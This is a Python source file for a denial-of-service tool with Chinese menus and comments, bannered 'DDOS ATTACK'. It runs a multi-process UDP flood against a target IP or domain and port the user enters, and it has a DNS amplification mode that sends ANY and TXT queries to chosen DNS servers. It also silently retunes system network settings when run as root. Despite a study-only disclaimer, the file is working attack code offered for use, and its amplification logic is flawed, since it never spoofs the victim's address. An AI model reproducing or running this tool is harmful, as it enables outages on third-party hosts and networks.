import socket
import random
import time
from multiprocessing import Process, Manager, Value, cpu_count, shared_memory
import sys
import os
import threading
import math
import ctypes
import struct
from ctypes import Structure, c_ushort, c_byte, c_uint32, pointer, sizeof

def print_banner():
    print("""
    ██████╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
    ██║  ██║██║  ██║██║   ██║███████╗
    ██║  ██║██║  ██║██║   ██║╚════██║
    ██████╔╝██████╔╝╚██████╔╝███████║
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝


     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
    ███████║   ██║      ██║   ███████║██║     █████╔╝ 
    ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """)
    print(">>>>>>>>>>>>>>>> WARNING <<<<<<<<<<<<<<<<<<")
    print("| 此工具仅供学习和压力测试使用，请勿用于非法用途 |")
    print(">>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<")
    print("\n/---------------------------------------------------\\")
    print("|   作者          : Tanghao                       |")
    print("|   GitHub     : https://github.com/HaoTang9878     |")
    print("|   版本          : V0.1.0                        |")
    print("|   QQ交群    : 1032304553    |")
    print("\\---------------------------------------------------/")
print_banner()
class UDPFlooder:
    def __init__(self):
        self.amp_factors = {  # 新增放大系数配置
            'any': 66,  # ANY查询的放大倍数
            'txt': 70,  # TXT记录的放大倍数
            'a': 30     # A记录的放大倍数
        }
        self.libc = ctypes.CDLL("libc.so.6")
        self.libc.sendto.argtypes = [
            ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t,
            ctypes.c_int, ctypes.c_void_p, ctypes.c_uint32
        ]
        self.libc.sendto.restype = ctypes.c_ssize_t
        self.cpu_cores = cpu_count()
        self.interface = self.detect_interface()
        self.optimize_system(silent=True)
        

    def detect_interface(self):
        """自动检测活动网络接口"""
        try:
            with os.popen("ip route show default") as f:
                default_route = f.read()
                if "dev" in default_route:
                    return default_route.split("dev ")[1].split()[0]
            net_dir = '/sys/class/net/'
            interfaces = [iface for iface in os.listdir(net_dir) 
                         if iface != 'lo' and os.path.isdir(net_dir + iface)]
            return interfaces[0] if interfaces else "eth0"
        except:
            return "eth0"   
        
    def optimize_system(self, silent=True):
        """安全静默的系统优化"""
        try:
            if os.geteuid() == 0:
                null = ">/dev/null 2>&1" if silent else ""
                commands = [
                    f"sysctl -wq net.core.wmem_max=16777216 {null}",
                    f"sysctl -wq net.ipv4.ip_local_port_range='1024 65535' {null}",
                    f"ethtool -G {self.interface} rx 4096 tx 4096 {null}",
                    f"ethtool -K {self.interface} tx on gso on {null}"
                ]
                for cmd in commands:
                    os.system(cmd)
        except:
            pass       
    @staticmethod
    def human_bytes(size):
        """智能显示字节单位"""
        units = ("B", "KB", "MB", "GB", "TB")
        if size < 1024:
            return f"{size}B"
        exp = int(math.log(size, 1024))
        return f"{size/1024**exp:.2f}{units[exp]}"
    
    # 新增动态解析方法-------------------------------------
    def resolve_target(self, target, ip_dict, stop_event):
        """持续解析目标域名/IP"""
        while not stop_event.is_set():
            try:
                if target.replace('.', '').isdigit():  # 已经是IP
                    current_ip = target
                else:
                    current_ip = socket.gethostbyname(target)
                
                if ip_dict.get('current_ip') != current_ip:
                    ip_dict['current_ip'] = current_ip
                    print(f"[DNS] 目标更新 → {current_ip}")
            except Exception as e:
                print(f"[DNS] 解析错误: {str(e)[:50]}...")
            time.sleep(5)  # 每30秒检查一次
    
    # 改造后的worker---------------------------------------
    def dynamic_flood_worker(self, ip_dict, port, stats_shm_name, stop_event):
        """支持动态IP变化的攻击线程"""
        shm = shared_memory.SharedMemory(name=stats_shm_name)
        stats = shm.buf
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)
        
        payload_pool = [os.urandom(size) for size in [1472, 1024, 512]]
        last_ip = None
        sockaddr = None
        
        try:
            while not stop_event.is_set():
                current_ip = ip_dict.get('current_ip')
                if not current_ip:
                    time.sleep(1)
                    continue
                
                # IP变化时更新socket地址
                if current_ip != last_ip:
                    try:
                        sockaddr, addrlen = self.create_sockaddr(current_ip, port)
                        last_ip = current_ip
                    except Exception as e:
                        print(f"[ERROR] 地址更新失败: {e}")
                        time.sleep(1)
                        continue
                
                # 攻击逻辑
                try:
                    payload = random.choice(payload_pool)
                    self.libc.sendto(
                        sock.fileno(),
                        payload,
                        len(payload),
                        0,
                        sockaddr,
                        addrlen
                    )
                    with memoryview(stats).cast('Q') as mv:
                        mv[0] += len(payload)
                        
                except (socket.error, OSError) as e:
                    if "No route to host" in str(e):
                        print(f"[WARN] 目标不可达: {last_ip}")
                    time.sleep(0.01)
        finally:
            sock.close()
            shm.close()
    # -----------------------------------------------------

    def create_sockaddr(self, ip, port):
        """创建优化的socket地址结构体（带IP验证）"""
        try:
            socket.inet_aton(ip)
        except socket.error:
            try:
                ip = socket.gethostbyname(ip)
            except:
                raise ValueError(f"非法IP/域名: {ip}")
        addr = (c_byte * 16)()
        addr[:2] = struct.pack('H', socket.AF_INET)
        addr[2:4] = struct.pack('H', socket.htons(port))
        addr[4:8] = socket.inet_aton(ip)
        return pointer(addr), sizeof(addr)          

    # ... (保留原有的generate_dns_query、dns_amplification_worker、monitor等方法不变)
    def generate_dns_query(self, domain, qtype=255):
        """支持指定查询类型的DNS包生成"""
        header = struct.pack('!HHHHHH', 
                        random.randint(0, 65535), 0x0100, 1, 0, 0, 0)
        qname = b''.join(len(p).to_bytes(1,'big') + p.encode() 
                        for p in domain.split('.')) + b'\x00'
        return header + qname + struct.pack('!HH', qtype, 1)  # 参数化查询类型

    def dns_amplification_worker(self, dns_servers, ip_dict, stats_shm_name, stop_event):
        shm = shared_memory.SharedMemory(name=stats_shm_name)
        stats = shm.buf
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # 修改点1：增加查询类型选择
        query_types = [
            (255, 'any'),  # ANY查询
            (16, 'txt'),   # TXT记录
            (1, 'a')       # A记录
        ]
        
        last_target = None
        sent_bytes = 0
        
        try:
            while not stop_event.is_set():
                current_target = ip_dict.get('current_ip')
                if not current_target:
                    time.sleep(1)
                    continue
                    
                if current_target != last_target:
                    last_target = current_target
                    print(f"[DNS] 攻击目标更新 → {current_target}")
                
                try:
                    # 修改点2：动态选择查询类型
                    qtype, amp_type = random.choices(
                        query_types,
                        weights=[0.7, 0.2, 0.1]  # 70% ANY, 20% TXT, 10% A
                    )[0]
                    
                    domain = f"rand{random.randint(0,99999)}.cloudflare.com"
                    query = self.generate_dns_query(domain, qtype)  # 需修改generate_dns_query方法
                    
                    # 发送查询包
                    server = random.choice(dns_servers)
                    sock.sendto(query, (server.strip(), 53))
                    
                    # 修改点3：动态计算放大流量
                    current_factor = self.amp_factors[amp_type]
                    estimated_response = len(query) * current_factor
                    sent_bytes += estimated_response
                    
                    if sent_bytes >= 10 * estimated_response:
                        with memoryview(stats).cast('Q') as mv:
                            mv[0] += sent_bytes
                        sent_bytes = 0
                        
                except (socket.error, OSError) as e:
                    if "No route to host" in str(e):
                        print(f"[WARN] DNS服务器不可达: {server}")
                    time.sleep(0.1)
        finally:
            sock.close()
            shm.close()

    def monitor(self, stats_shm_name, process_count, stop_event):
        """修改后的监控函数"""
        shm = shared_memory.SharedMemory(name=stats_shm_name)
        stats = shm.buf
        
        start_time = time.time()
        last_bytes = memoryview(stats).cast('Q')[0]
        last_time = start_time
        
        while not stop_event.is_set():
            current_bytes = memoryview(stats).cast('Q')[0]
            now = time.time()
            
            if now - last_time >= 1.0:
                elapsed = max(0.1, now - start_time)
                instant = (current_bytes - last_bytes) / (now - last_time)
                avg = current_bytes / elapsed
                
                print(f"\r[STATS] Total: {self.human_bytes(current_bytes)} | "
                    f"Instant: {self.human_bytes(instant)}/s | "
                    f"Avg: {self.human_bytes(avg)}/s | "
                    f"Cores: {process_count} | "
                    f"Duration: {int(elapsed)}s", end="", flush=True)
                
                last_bytes = current_bytes
                last_time = now
            
            time.sleep(0.5)  # 稍微降低采样频率
        
        shm.close() 

    def run(self):
        print(f"\n[UDP/DNS Attack Master] Cores: {self.cpu_cores} | Interface: {self.interface}")
        
        print("\n攻击模式:")
        print("1. UDP洪水攻击")
        print("2. DNS放大攻击")
        mode = int(input("选择模式(1/2): "))
        
        if mode == 1:
            target = input("目标(IP/域名): ").strip()  # 修改为通用输入
            port = int(input("目标端口: "))
            processes = min(int(input(f"进程数(1-{max(32, self.cpu_cores)}): ")), min(32, self.cpu_cores))
            
            stats_shm = shared_memory.SharedMemory(create=True, size=8)
            memoryview(stats_shm.buf).cast('Q')[0] = 0
            
            try:
                with Manager() as manager:
                    ip_dict = manager.dict({'current_ip': None})  # 新增共享字典
                    stop_event = manager.Event()
                    
                    # 启动解析器（无论是IP还是域名都统一处理）
                    resolver = Process(
                        target=self.resolve_target,
                        args=(target, ip_dict, stop_event)
                    )
                    resolver.start()
                    
                    monitor = Process(target=self.monitor, 
                                    args=(stats_shm.name, processes, stop_event))
                    monitor.start()
                    
                    # 使用改造后的worker
                    workers = []
                    for _ in range(processes):
                        p = Process(
                            target=self.dynamic_flood_worker,
                            args=(ip_dict, port, stats_shm.name, stop_event)
                        )
                        p.start()
                        workers.append(p)
                        
                    try:
                        while True:
                            time.sleep(5)
                    except KeyboardInterrupt:
                        stop_event.set()
            finally:
                stats_shm.close()
                stats_shm.unlink()
        
        elif mode == 2:
            target = input("目标(IP/域名): ").strip()
            dns_servers = [s.strip() for s in input("DNS服务器列表(逗号分隔): ").split(',') if s.strip()]
            processes = min(int(input(f"进程数(1-{max(32, self.cpu_cores)}): ")), min(32, self.cpu_cores))
            
            stats_shm = shared_memory.SharedMemory(create=True, size=8)
            memoryview(stats_shm.buf).cast('Q')[0] = 0
            
            try:
                with Manager() as manager:
                    ip_dict = manager.dict({'current_ip': None})
                    stop_event = manager.Event()
                    
                    # 启动目标解析器
                    resolver = Process(
                        target=self.resolve_target,
                        args=(target, ip_dict, stop_event)
                    )
                    resolver.start()
                    
                    monitor = Process(target=self.monitor, 
                                    args=(stats_shm.name, processes, stop_event))
                    monitor.start()
                    
                    # 启动改造后的worker
                    workers = []
                    for _ in range(processes):
                        p = Process(
                            target=self.dns_amplification_worker,
                            args=(dns_servers, ip_dict, stats_shm.name, stop_event)
                        )
                        p.start()
                        workers.append(p)
                        
                    try:
                        while True:
                            time.sleep(5)
                    except KeyboardInterrupt:
                        stop_event.set()
                        print("\n[!] 停止所有工作进程...")
            finally:
                stats_shm.close()
                stats_shm.unlink()

if __name__ == "__main__":
    UDPFlooder().run()
